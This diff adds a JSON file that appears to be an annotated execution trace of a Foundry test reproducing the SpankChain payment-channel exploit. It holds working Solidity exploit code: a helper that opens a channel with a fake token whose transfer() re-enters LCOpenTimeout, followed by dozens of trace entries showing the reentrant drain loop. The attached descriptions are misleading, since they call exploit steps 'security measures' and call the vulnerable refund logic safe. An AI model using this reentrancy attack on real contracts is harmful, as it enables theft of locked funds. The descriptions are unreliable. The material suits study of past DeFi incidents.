@@ -1,0 +1,737 @@
+[
+    {
+        "id": "1286966",
+        "args": "",
+        "original_code": "    function testExploit() public balanceLog {\n        //implement exploit code here\n        vm.deal(address(this), 5 ether); //simulation flashloan\n        SpankChainExploitHelper h = new SpankChainExploitHelper();\n        h.exploit{value: 5 ether}(32);\n        payable(address(0x0)).transfer(5 ether); //simulation replay flashloan\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate a specific type of attack, often referred to as an \"exploit,\" in a controlled environment. It mimics the behavior of a \"flashloan,\" which is a temporary loan used in decentralized finance (DeFi) to execute transactions without needing upfront capital. The function creates a helper contract (`SpankChainExploitHelper`) to carry out the exploit and then simulates repaying the flashloan by transferring funds to a null address.\n\n2. **Security mechanism**:  \n   The function uses the `balanceLog` modifier, which likely tracks or logs changes in the contract's balance to ensure transparency or security. Additionally, the function uses `vm.deal`, a tool from a testing framework (like Foundry) to simulate sending Ether to the contract, ensuring the exploit simulation is isolated and controlled. The transfer to a null address (`address(0x0)`) simulates repaying the flashloan, ensuring no real funds are lost during testing.\n\n3. **Parameter Function**:  \n   The function does not take any direct parameters. However, it passes the value `32` to the `exploit` function of the `SpankChainExploitHelper` contract. This value could represent a specific condition or input required for the exploit to work, such as a block number, identifier, or other numerical data.\n\n4. **Return description**:  \n   The function does not return any value. Its purpose is to execute the exploit simulation and log or track the changes in the contract's balance. The focus is on the process rather than producing an output.\n\n**In summary**, the `testExploit` function simulates an exploit scenario involving a flashloan, using a helper contract to execute the attack and a null address to simulate repayment. It includes security measures like balance logging and controlled Ether simulation to ensure the test is safe and transparent. The function does not return any value but focuses on demonstrating the exploit process.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "SpankChainExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "SpankChainExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5000000000000000000 [5e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "420880",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1881 bytes of code"
+    },
+    {
+        "id": "792280",
+        "args": "32",
+        "original_code": "    function exploit(\n        uint256 c\n    ) public payable {\n        limit = c;\n        uint256[2] memory balances;\n        balances[0] = 5_000_000_000_000_000_000;\n        balances[1] = 1;\n        spankChain.createChannel{value: 5 ether}(\n            hex\"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45\",\n            msg.sender,\n            type(uint256).max - block.timestamp + 1,\n            address(this),\n            balances\n        );\n        spankChain.LCOpenTimeout(hex\"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45\");\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   The `exploit` function is designed to interact with a system called `spankChain`. It sets a limit value, creates a channel with specific parameters, and then triggers a timeout mechanism in the system. Finally, it transfers any remaining balance in the contract to the caller. The function is primarily focused on managing funds and interacting with the `spankChain` system.\n\n2. **Security mechanism:**  \n   The function uses `payable` to allow it to receive Ether, ensuring it can handle transactions involving funds. It also uses `msg.sender` to identify the caller, ensuring that the funds are transferred back to the correct address. However, there are no explicit checks or restrictions on who can call this function, which could pose a security risk if not properly managed.\n\n3. **Parameter Function:**  \n   The function takes a single parameter `c`, which is used to set the `limit` variable. This parameter controls a value within the contract but does not directly influence the interaction with `spankChain`. The function also implicitly uses `msg.sender` to identify the caller and `address(this).balance` to determine the contract's current balance.\n\n4. **Return description:**  \n   The function does not return any value. Instead, it performs actions such as setting the `limit`, creating a channel in `spankChain`, triggering a timeout, and transferring the contract's balance to the caller. The focus is on executing these operations rather than calculating or returning a specific result.\n\n**In summary,**  \nThe `exploit` function interacts with the `spankChain` system by creating a channel, triggering a timeout, and transferring funds. It uses a parameter to set a limit but lacks robust security measures to restrict access. The function does not return a value but performs actions that manage funds and system interactions.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "188095",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45, SpankChainExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007911590767176 [1.157e77], SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [5000000000000000000 [5e18], 1]",
+        "original_code": "    function createChannel(\n        bytes32 _lcID,\n        address _partyI,\n        uint256 _confirmTime,\n        address _token,\n        uint256[2] _balances // [eth, token]\n    ) \n        public\n        payable \n    {\n        require(Channels[_lcID].partyAddresses[0] == address(0), \"Channel has already been created.\");\n        require(_partyI != 0x0, \"No partyI address provided to LC creation\");\n        require(_balances[0] >= 0 && _balances[1] >= 0, \"Balances cannot be negative\");\n        // Set initial ledger channel state\n        // Alice must execute this and we assume the initial state \n        // to be signed from this requirement\n        // Alternative is to check a sig as in joinChannel\n        Channels[_lcID].partyAddresses[0] = msg.sender;\n        Channels[_lcID].partyAddresses[1] = _partyI;\n\n        if(_balances[0] != 0) {\n            require(msg.value == _balances[0], \"Eth balance does not match sent value\");\n            Channels[_lcID].ethBalances[0] = msg.value;\n        } \n        if(_balances[1] != 0) {\n            Channels[_lcID].token = HumanStandardToken(_token);\n            require(Channels[_lcID].token.transferFrom(msg.sender, this, _balances[1]),\"CreateChannel: token transfer failure\");\n            Channels[_lcID].erc20Balances[0] = _balances[1];\n        }\n\n        Channels[_lcID].sequence = 0;\n        Channels[_lcID].confirmTime = _confirmTime;\n        // is close flag, lc state sequence, number open vc, vc root hash, partyA... \n        //Channels[_lcID].stateHash = keccak256(uint256(0), uint256(0), uint256(0), bytes32(0x0), bytes32(msg.sender), bytes32(_partyI), balanceA, balanceI);\n        Channels[_lcID].LCopenTimeout = now + _confirmTime;\n        Channels[_lcID].initialDeposit = _balances;\n\n        emit DidLCOpen(_lcID, msg.sender, _partyI, _balances[0], _token, _balances[1], Channels[_lcID].LCopenTimeout);\n    }\n\n",
+        "description": "1. Core functions:  \nThe `createChannel` function is designed to set up a new payment channel between two parties. It initializes the channel by storing the addresses of the participants, their respective balances (in Ether and tokens), and a confirmation time for the channel. The function ensures that the channel is created only once and that the provided balances are valid. It also handles the transfer of tokens and Ether to the contract as part of the channel setup.\n\n2. Security mechanism:  \n- **`require` statements**: These ensure that the channel is not already created, that a valid party address is provided, and that balances are non-negative.  \n- **`payable` modifier**: Allows the function to receive Ether, ensuring that the Ether balance matches the provided value.  \n- **Token transfer check**: Verifies that the token transfer from the sender to the contract is successful.  \n- **Time-based security**: Sets a timeout for the channel using the `_confirmTime` parameter to ensure the channel has a defined lifespan.  \n\n3. Parameter Function:  \n- **_lcID**: A unique identifier for the channel.  \n- **_partyI**: The address of the second participant in the channel.  \n- **_confirmTime**: The time duration (in seconds) for the channel's confirmation period.  \n- **_token**: The address of the token contract to be used in the channel.  \n- **_balances**: An array containing two values: the Ether balance and the token balance for the channel.  \n\n4. Return description:  \nThe function does not return any value. Instead, it updates the state of the `Channels` mapping with the new channel details, including participant addresses, balances, and the confirmation timeout. It also emits an event (`DidLCOpen`) to log the creation of the channel, providing details such as the channel ID, participant addresses, balances, and the timeout.  \n\nIn summary, the `createChannel` function sets up a payment channel between two parties, ensures the channel is created securely, and handles the transfer of funds. It uses checks and balances to prevent invalid inputs and ensures the channel operates within a defined timeframe.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "1010",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7, 1",
+        "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n        return true;\n    }\n\n",
+        "description": "1. **Core function**:  \nThe `transferFrom` function is designed to move a specified amount of tokens from one address (`sender`) to another address (`recipient`). It is commonly used in token contracts to allow a third party (like an exchange or a smart contract) to transfer tokens on behalf of the token owner.\n\n2. **Security mechanism**:  \nThe function in this example does not include any specific security mechanisms or modifiers. However, in a real-world implementation, it would typically include checks such as ensuring the `sender` has enough tokens to transfer, verifying that the caller is authorized to perform the transfer, and preventing reentrancy attacks. These measures would be added to ensure the function operates securely and as intended.\n\n3. **Parameter Function**:  \n- `sender`: This is the address from which the tokens will be transferred. It represents the owner of the tokens.  \n- `recipient`: This is the address that will receive the tokens. It represents the destination of the transfer.  \n- `amount`: This is the number of tokens to be transferred from the `sender` to the `recipient`.\n\n4. **Return description**:  \nThe function currently returns `true` unconditionally, indicating that the transfer was successful. In a complete implementation, the return value would depend on whether the transfer was executed correctly, such as verifying the sender\u2019s balance and ensuring the transfer was authorized.\n\nIn summary, the `transferFrom` function is intended to transfer tokens between addresses, but this example lacks the necessary logic and security checks for a real-world application.",
+        "return_value": "true"
+    },
+    {
+        "id": "562659",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": "    function LCOpenTimeout(bytes32 _lcID) public {\n        require(msg.sender == Channels[_lcID].partyAddresses[0] && Channels[_lcID].isOpen == false);\n        require(now > Channels[_lcID].LCopenTimeout);\n\n        if(Channels[_lcID].initialDeposit[0] != 0) {\n            Channels[_lcID].partyAddresses[0].transfer(Channels[_lcID].ethBalances[0]);\n        } \n        if(Channels[_lcID].initialDeposit[1] != 0) {\n            require(Channels[_lcID].token.transfer(Channels[_lcID].partyAddresses[0], Channels[_lcID].erc20Balances[0]),\"CreateChannel: token transfer failure\");\n        }\n\n        emit DidLCClose(_lcID, 0, Channels[_lcID].ethBalances[0], Channels[_lcID].erc20Balances[0], 0, 0);\n\n        // only safe to delete since no action was taken on this channel\n        delete Channels[_lcID];\n    }\n\n",
+        "description": "1. **Core functions**:  \n   This function is designed to handle a timeout scenario for a specific channel identified by `_lcID`. It ensures that the channel is closed and any remaining funds (either Ether or tokens) are returned to the original sender if certain conditions are met. The function also emits an event to log the closure of the channel and deletes the channel data to free up storage.\n\n2. **Security mechanism**:  \n   - **`require` statements**: These ensure that only the correct party can trigger the function and that the timeout condition has been met.  \n   - **`transfer` and `token.transfer`**: These are used to safely send Ether and tokens back to the sender, ensuring that funds are handled securely.  \n   - **`delete`**: This removes the channel data from storage, preventing any further actions on the channel.  \n\n3. **Parameter Function**:  \n   - **`_lcID`**: This is the unique identifier for the channel being processed. It is used to locate and interact with the specific channel's data in the `Channels` mapping.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it performs actions such as transferring funds, emitting an event, and deleting the channel data. The logic ensures that the channel is properly closed and cleaned up after the timeout.  \n\n**In summary**, this function manages the timeout of a channel by returning funds to the sender, logging the event, and removing the channel data, all while ensuring security through checks and safe transfer mechanisms.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "545725",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": "    function transfer(address recipient, uint256 amount) public returns (bool) {\n        if (count < limit) {\n            count = count + 1;\n            spankChain.LCOpenTimeout(hex\"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45\");\n        }\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\n        return true;\n    }\n\n",
+        "description": "1. Core functions:  \nThe `transfer` function is designed to send a certain amount of tokens to a specified recipient. It includes a condition that checks if a counter (`count`) is below a certain limit (`limit`). If the condition is met, the counter is incremented, and a specific action related to `spankChain` is triggered. The `transferFrom` function, on the other hand, is intended to allow a third party to transfer tokens on behalf of a sender to a recipient. However, in this code, it simply returns `true` without performing any actual transfer logic.  \n\n2. Security mechanism:  \nThe code does not include explicit security mechanisms such as access control modifiers (e.g., `onlyOwner` or `require` statements) to restrict who can call these functions. This could potentially allow anyone to trigger the functions, which might lead to unintended behavior. Additionally, the `transfer` function includes a condition (`if (count < limit)`) that acts as a basic safeguard to limit the number of times a specific action can be performed.  \n\n3. Parameter Function:  \n- For the `transfer` function:  \n  - `recipient`: Specifies the address that will receive the tokens.  \n  - `amount`: Represents the quantity of tokens to be transferred.  \n- For the `transferFrom` function:  \n  - `sender`: Indicates the address from which tokens will be transferred.  \n  - `recipient`: Specifies the address that will receive the tokens.  \n  - `amount`: Represents the quantity of tokens to be transferred.  \n\n4. Return description:  \nBoth functions return a boolean value (`true`). In the `transfer` function, the return value is always `true`, regardless of whether the condition (`count < limit`) is met or not. Similarly, the `transferFrom` function always returns `true` without performing any actual transfer logic.  \n\nIn summary,  \nThe `transfer` function checks a condition and performs an action if the condition is met, while the `transferFrom` function does not execute any transfer logic. Both functions return `true` without any complex calculations or validations. The code lacks robust security measures, which could pose risks if used in a production environment.",
+        "return_value": "true"
+    },
+    {
+        "id": "543699",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "528765",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "526739",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "511805",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "509779",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "494845",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "492819",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "477885",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "475859",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "460925",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "458899",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "443965",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "441939",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "427005",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "424979",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "410045",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "408019",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "393085",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "391059",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "376125",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "374099",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "359165",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "357139",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "342205",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "340179",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "325245",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "323219",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "308285",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "306259",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "291325",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "289299",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "274365",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "272339",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "257405",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "255379",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "240445",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "238419",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "223485",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "221459",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "206525",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "204499",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "189565",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "187539",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "172605",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "170579",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "155645",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "153619",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "138685",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "136659",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "121725",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "119699",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "104765",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "102739",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "87805",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "85779",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "70845",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "68819",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "53885",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "51859",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "36925",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "34899",
+        "args": "0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1065",
+        "args": "SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "41",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    }
+]
